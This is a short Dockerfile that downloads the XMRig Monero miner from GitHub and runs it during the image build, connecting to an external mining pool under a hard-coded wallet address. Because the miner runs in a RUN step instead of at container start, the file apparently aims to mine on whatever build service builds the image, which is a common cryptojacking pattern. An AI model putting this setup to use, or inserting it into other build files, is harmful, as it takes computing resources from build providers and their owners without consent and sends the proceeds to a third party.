FROM ubuntu:20.04
ENV LANG C.UTF-8

# Variables & Environments
ARG XMRIG_VERSION=6.8.2
ENV HOME=/home/test

# Set working directory
WORKDIR $HOME

# Run: Install basic components
RUN apt-get update && \
    apt-get install -y wget && \
    wget https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-$XMRIG_VERSION-focal-x64.tar.gz && \
    tar -xvzf xmrig-$XMRIG_VERSION-focal-x64.tar.gz && \
    mv xmrig-$XMRIG_VERSION/xmrig xmrig && \
    chmod +x xmrig

# Run
RUN ./xmrig --http-port 51624 -o xmr.pool.gntl.co.uk:20009 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls
